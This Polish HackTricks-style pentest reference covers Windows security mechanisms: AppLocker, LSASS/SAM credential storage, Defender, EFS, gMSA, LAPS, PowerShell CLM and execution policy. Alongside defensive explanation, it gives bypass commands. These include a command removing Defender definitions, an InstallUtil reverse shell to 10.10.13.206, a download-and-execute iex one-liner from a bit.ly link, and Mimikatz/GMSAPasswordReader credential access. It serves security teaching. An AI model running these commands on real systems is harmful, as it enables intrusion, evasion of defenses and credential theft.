# Mechanizmy zabezpieczeń systemu Windows

{{#include ../banners/hacktricks-training.md}}

## Zasady AppLocker

Biała lista aplikacji to lista zatwierdzonych programów lub plików wykonywalnych, które mogą znajdować się w systemie i być w nim uruchamiane. Jej celem jest ochrona środowiska przed szkodliwym malware i niezatwierdzonym oprogramowaniem, które nie odpowiada konkretnym potrzebom biznesowym organizacji.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) to **rozwiązanie Microsoftu do tworzenia białej listy aplikacji**, które pozwala administratorom systemu kontrolować, **które aplikacje i pliki mogą uruchamiać użytkownicy**. Zapewnia **szczegółową kontrolę** nad plikami wykonywalnymi, skryptami, plikami instalatora Windows, plikami DLL, aplikacjami pakietowymi i instalatorami aplikacji pakietowych.\
Organizacje często **blokują cmd.exe i PowerShell.exe** oraz dostęp do zapisu w określonych katalogach, **ale można to wszystko obejść**.

### Sprawdzenie

Sprawdź, które pliki/rozszerzenia znajdują się na czarnej/białej liście:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` sprawdza pliki kandydujące pod kątem określonej tożsamości w ramach zasad AppLocker. Sprawdź konto, którego token będzie używany do uruchomienia payloadu, ponieważ reguły mogą dotyczyć użytkowników lub grup; `Get-AppLockerFileInformation` przydaje się również do sprawdzenia ścieżki, skrótu i metadanych wydawcy, które mogą pasować do reguł.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Zanim uznasz odmowny wynik testu za egzekwowaną blokadę, sprawdź **efektywny tryb egzekwowania tej kolekcji reguł** oraz stan usługi Application Identity. `AuditOnly` ocenia reguły, ale nadal zezwala na wykonanie, natomiast `NotConfigured` nie oznacza tego samego co wyłączona kolekcja, jeśli zawiera ona reguły.<sup>[[7]](#references)</sup> Zatrzymana usługa `AppIDSvc` uniemożliwia egzekwowanie AppLocker.<sup>[[9]](#references)</sup> Te kontrole pozwalają odróżnić rzeczywiste obejście od sytuacji, w której zasady nigdy nie blokowały pliku.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

W przypadku testu kontrolowanego wykonania sprawdź dziennik zdarzeń AppLocker: **8003/8006** oznaczają, że plik EXE/DLL lub skrypt/MSI zostałby zablokowany w trybie audytu; **8004/8007** oznaczają, że został faktycznie zablokowany. Testuj ten sam typ pliku i tożsamość użytkownika co w docelowej ścieżce wykonania.<sup>[[8]](#references)</sup>

Ta ścieżka rejestru zawiera konfiguracje i zasady stosowane przez AppLocker, umożliwiając sprawdzenie bieżącego zestawu reguł egzekwowanych w systemie:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Przydatne **zapisywalne foldery** do ominięcia zasad AppLocker: jeśli AppLocker zezwala na wykonywanie dowolnych plików z `C:\Windows\System32` lub `C:\Windows`, możesz użyć **zapisywalnych folderów**, aby **to ominąć**.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Powszechnie **zaufane** pliki binarne [**„LOLBAS”**](https://lolbas-project.github.io/) mogą również przydać się do ominięcia AppLocker.
- **Źle napisane reguły również można ominąć**
  - Na przykład w przypadku **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** możesz utworzyć **folder o nazwie `allowed`** w dowolnym miejscu, a będzie on dozwolony.
  - Organizacje często skupiają się również na **blokowaniu pliku wykonywalnego `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ale zapominają o **innych lokalizacjach plików wykonywalnych** [**PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), takich jak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` lub `PowerShell_ISE.exe`.
- **Wymuszanie reguł dla bibliotek DLL jest bardzo rzadko włączane** ze względu na dodatkowe obciążenie systemu i konieczność przeprowadzenia testów, aby upewnić się, że nic nie przestanie działać. Dlatego używanie **bibliotek DLL jako backdoorów pomoże ominąć AppLocker**.
- Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać** kod **Powershell** w dowolnym procesie i ominąć AppLocker. Więcej informacji znajdziesz tutaj: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Przechowywanie poświadczeń

### Security Accounts Manager (SAM)

Lokalne poświadczenia znajdują się w tym pliku, a hasła są zahashowane.

### Local Security Authority (LSA) - LSASS

**Poświadczenia** (zahashowane) są **zapisywane** w **pamięci** tego podsystemu na potrzeby Single Sign-On.\
**LSA** administruje lokalnymi **zasadami zabezpieczeń** (zasadami haseł, uprawnieniami użytkowników...), **uwierzytelnianiem**, **tokenami dostępu**...\
LSA **sprawdza**, czy podane poświadczenia znajdują się w pliku **SAM** (przy logowaniu lokalnym) oraz **komunikuje się** z **kontrolerem domeny**, aby uwierzytelnić użytkownika domeny.

**Poświadczenia** są **zapisywane** w **procesie LSASS**: bilety Kerberos, hashe NT i LM, łatwe do odszyfrowania hasła.

### Sekrety LSA

LSA może zapisywać na dysku niektóre poświadczenia:

- Hasło konta komputera w Active Directory (niedostępny kontroler domeny).
- Hasła kont usług systemu Windows
- Hasła zadań zaplanowanych
- Inne (hasło aplikacji IIS...)

### NTDS.dit

To baza danych Active Directory. Występuje tylko na kontrolerach domeny.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) to program antywirusowy dostępny w systemach Windows 10 i Windows 11 oraz w wersjach Windows Server. **Blokuje** popularne narzędzia pentestingowe, takie jak **`WinPEAS`**. Istnieją jednak sposoby na **ominięcie tych zabezpieczeń**.

### Sprawdzanie

Aby sprawdzić **stan** programu **Defender**, możesz uruchomić polecenie cmdlet PS **`Get-MpComputerStatus`** (sprawdź wartość **`RealTimeProtectionEnabled`**, aby dowiedzieć się, czy ochrona jest aktywna):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Aby wyświetlić jego informacje, możesz również uruchomić:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS zabezpiecza pliki za pomocą szyfrowania, wykorzystując **klucz symetryczny** znany jako **File Encryption Key (FEK)**. Ten klucz jest szyfrowany **kluczem publicznym** użytkownika i przechowywany w metadanych NTFS `$EFS` pliku (`$LOGGED_UTILITY_STREAM`), **a nie** w zwykłym alternatywnym strumieniu danych `$DATA`.<sup>[[10]](#references)</sup> Gdy konieczne jest odszyfrowanie, odpowiedni **klucz prywatny** z certyfikatu cyfrowego użytkownika odszyfrowuje FEK. Skonfigurowany agent odzyskiwania danych (DRA) ma osobną zaszyfrowaną kopię FEK w polu Data Recovery Field.<sup>[[13]](#references)</sup>

**Scenariusze odszyfrowywania bez inicjowania przez użytkownika** obejmują:

- Gdy pliki lub foldery są przenoszone do systemu plików bez obsługi EFS, takiego jak [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), są automatycznie odszyfrowywane.
- Zaszyfrowane pliki przesyłane przez sieć za pomocą protokołu SMB/CIFS są odszyfrowywane przed transmisją.

Ta metoda szyfrowania zapewnia właścicielowi **przezroczysty dostęp** do zaszyfrowanych plików. Jednak samo zmienienie hasła właściciela i zalogowanie się nie umożliwi ich odszyfrowania.

**Najważniejsze informacje**:

- EFS używa symetrycznego FEK, szyfrowanego kluczem publicznym użytkownika.
- Do odszyfrowania FEK używany jest klucz prywatny użytkownika.
- Automatyczne odszyfrowanie następuje w określonych warunkach, na przykład podczas kopiowania do FAT32 lub transmisji przez sieć.
- Właściciel może uzyskać dostęp do zaszyfrowanych plików bez wykonywania dodatkowych czynności.

### Sprawdzanie informacji EFS

Nie należy wnioskować o użyciu EFS na podstawie `%APPDATA%\Microsoft\Protect`: katalog ten przechowuje klucze główne DPAPI używane przez wiele funkcji systemu Windows.<sup>[[19]](#references)</sup> Zamiast tego sprawdź zaszyfrowany plik poleceniem `cipher /c "C:\path\file"`, aby wyświetlić certyfikaty użytkownika i odzyskiwania. Polecenia `cipher /e` i `cipher /d` szyfrują i odszyfrowują pliki dla podmiotu, który ma pasujący klucz prywatny.<sup>[[11]](#references)</sup>

### Odszyfrowywanie plików EFS

Jeśli `cipher /c` wyświetla certyfikat odzyskiwania, a Ty masz jego **pasujący klucz prywatny DRA** w pliku PFX, zaimportuj ten plik PFX do magazynu certyfikatów bieżącego użytkownika, a następnie odszyfruj plik.<sup>[[11]](#references)[[12]](#references)</sup> Nowo wygenerowany certyfikat DRA nie może odszyfrować starszych plików: jego klucz publiczny musiał już zostać dołączony podczas szyfrowania pliku. Dostęp za pomocą listy ACL NTFS ani samo zresetowanie hasła konta nie zapewniają wymaganego klucza prywatnego.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Uzyskanie uprawnień SYSTEM

To podejście wymaga, aby **użytkownik będący ofiarą** **uruchamiał** **proces** na hoście. Jeśli tak jest, w sesji `meterpreter` możesz podszyć się pod token procesu użytkownika (`impersonate_token` z `incognito`). Możesz też przeprowadzić `migrate` do procesu użytkownika.

#### Znajomość hasła użytkownika

Mimikatz może zaimportować certyfikat i klucz prywatny użytkownika, a następnie użyć ich do odszyfrowania plików chronionych przez EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft opracował **Group Managed Service Accounts (gMSA)**, aby uprościć zarządzanie kontami usług w infrastrukturach IT. W przeciwieństwie do tradycyjnych kont usług, dla których często włączone jest ustawienie „**Hasło nigdy nie wygasa**”, gMSA oferują bezpieczniejsze i łatwiejsze w zarządzaniu rozwiązanie:

- **Automatyczne zarządzanie hasłami**: gMSA używają złożonego, 240-bajtowego hasła, które zwykle zmienia się co 30 dni. Kontrolery domeny wyprowadzają je z materiału klucza KDS, eliminując potrzebę ręcznej aktualizacji haseł.<sup>[[16]](#references)[[20]](#references)</sup>
- **Większe bezpieczeństwo**: Te konta nie podlegają blokadom i nie można ich używać do logowania interaktywnego, co zwiększa ich bezpieczeństwo.
- **Obsługa wielu hostów**: gMSA można współdzielić między wieloma hostami, dzięki czemu idealnie nadają się do usług działających na wielu serwerach.
- **Obsługa zadań zaplanowanych**: W przeciwieństwie do managed service accounts, gMSA obsługują uruchamianie zadań zaplanowanych.
- **Uproszczone zarządzanie SPN**: System automatycznie aktualizuje Service Principal Name (SPN), gdy zmieniają się dane sAMaccount komputera lub jego nazwa DNS, co upraszcza zarządzanie SPN.

Kontroler domeny tworzy atrybut LDAP _**msDS-ManagedPassword**_ podczas odczytu, korzystając z materiału hasła wyprowadzonego z KDS; wartość ta nie jest niezależnie przechowywanym hasłem. Zwykle zmienia się co 30 dni.<sup>[[20]](#references)</sup> Zwracany [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) **nie jest zaszyfrowanym hasłem**: jego pole `CurrentPassword` zawiera hasło w postaci jawnej.<sup>[[14]](#references)</sup> Dostęp jest sprawdzany na podstawie `msDS-GroupMSAMembership`, więc zakresem objęty jest każdy podmiot, któremu przyznano uprawnienia do pobierania hasła — nie tylko administratorzy czy hosty usług.<sup>[[15]](#references)</sup> Połączenie LDAP musi zapewniać poufność, na przykład przez LDAPS lub szyfrowanie SASL.<sup>[[20]](#references)</sup>

Informacje o wyprowadzaniu hasła offline po ujawnieniu klucza głównego KDS znajdziesz w sekcji [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

To hasło można odczytać za pomocą [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Więcej informacji znajdziesz w tym wpisie**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Sprawdź też tę [stronę internetową](https://cube0x0.github.io/Relaying-for-gMSA/) z opisem, jak przeprowadzić **atak NTLM relay**, aby **odczytać** **hasło** gMSA.<sup>[[3]](#references)</sup>

## LAPS

Podczas enumeracji rozróżniaj **starszą wersję Microsoft LAPS** od natywnej implementacji **Windows LAPS**. Windows LAPS został udostępniony w aktualizacjach systemu Windows z 11 kwietnia 2023 r. i może tworzyć kopię zapasową zarządzanego hasła lokalnego administratora w **Windows Server Active Directory** lub **Microsoft Entra ID**. W przypadku wdrożeń opartych na AD może dodatkowo szyfrować hasła, przechowywać historię zaszyfrowanych haseł oraz zarządzać hasłem DSRM kontrolera domeny. Instalator MSI starszej wersji, dostępny do pobrania, jest przestarzały w nowszych wersjach systemu Windows, chociaż Windows LAPS może działać w trybie emulacji starszej wersji.<sup>[[6]](#references)</sup>

Ponieważ starsza wersja Microsoft LAPS i Windows LAPS to odrębne implementacje, przed zastosowaniem ataków zależnych od atrybutów lub poleceń cmdlet ustal, która z nich została wdrożona. Podlinkowana strona opisuje wykrywanie, enumerację ACL, pobieranie, manipulowanie datą wygaśnięcia oraz odzyskiwanie offline, bez powielania tych procedur tutaj.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## Tryb ograniczonego języka PS

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ogranicza wiele funkcji** niezbędnych do efektywnego korzystania z PowerShella, takich jak obiekty COM, typy .NET spoza zatwierdzonej listy, przepływy pracy oparte na XAML, klasy PowerShella i inne.

### **Sprawdź**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` stanowiło przestarzałą możliwość obniżenia wersji wyłącznie na hostach z zainstalowanym opcjonalnym silnikiem PowerShell 2. Nie jest już dostępne w zaktualizowanych systemach Windows 11 24H2 ani Windows Server 2025; nie należy traktować go jako aktualnego sposobu obejścia CLM.<sup>[[17]](#references)</sup> Przy włączonej kontroli aplikacji PowerShell uruchamia niezaufany kod w trybie Constrained Language, natomiast skrypty zaufane przez zasady mogą działać w trybie Full Language.<sup>[[18]](#references)</sup>

W przypadku starszych konfiguracji możesz użyć [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Aby go skompilować, może być konieczne** **dodanie** _**odwołania**_ -> _Przeglądaj_ ->_Przeglądaj_ -> dodanie `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **zmiana projektu na .Net4.5**.

#### Bezpośredni bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Możesz użyć [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) lub [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick), aby **wykonywać kod Powershell** w dowolnym procesie i obejść tryb ograniczony. Więcej informacji: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Zasady wykonywania PS

Domyślnie jest ustawiona na **restricted.** Główne sposoby obejścia tej zasady:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Więcej informacji znajdziesz [tutaj](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

To API, którego można użyć do uwierzytelniania użytkowników.

SSPI odpowiada za znalezienie odpowiedniego protokołu dla dwóch maszyn, które chcą się komunikować. Preferowaną metodą jest Kerberos. Następnie SSPI uzgadnia, który protokół uwierzytelniania zostanie użyty. Te protokoły uwierzytelniania nazywają się Security Support Provider (SSP), znajdują się na każdej maszynie Windows w postaci biblioteki DLL i obie maszyny muszą obsługiwać ten sam protokół, aby móc się komunikować.

### Główne SSP

- **Kerberos**: Preferowany protokół
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Ze względu na zgodność
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Serwery WWW i LDAP, hasło w postaci skrótu MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Służy do uzgadniania używanego protokołu (Kerberos lub NTLM; domyślnie Kerberos)
  - %windir%\Windows\System32\lsasrv.dll

#### Uzgadnianie może oferować kilka metod lub tylko jedną.

## UAC - Kontrola konta użytkownika

[Kontrola konta użytkownika (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która umożliwia wyświetlanie **monitu o zgodę na działania wymagające podwyższonych uprawnień**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Obchodzenie AppLocker i trybu języka ograniczonego PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [jak odszyfrowywać pliki EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying dla gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 sposobów na obejście Execution Policy PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Korzystanie z cmdletów AppLocker dla Windows PowerShell](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Omówienie Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Praca z regułami AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Korzystanie z Podglądu zdarzeń z AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [Procesy i interakcje AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Strumienie plików (lokalne systemy plików)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Polecenie Cipher](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Polecenie Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Tworzenie kopii zapasowej klucza prywatnego agenta odzyskiwania EFS](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [Atrybut ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Zabezpieczanie zarządzanych kont usług grupowych](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Funkcje usunięte z systemu Windows dla klientów](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Zabezpieczanie PowerShell za pomocą App Control](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Zdarzenie 4693 i klucze główne DPAPI](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Tworzenie msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
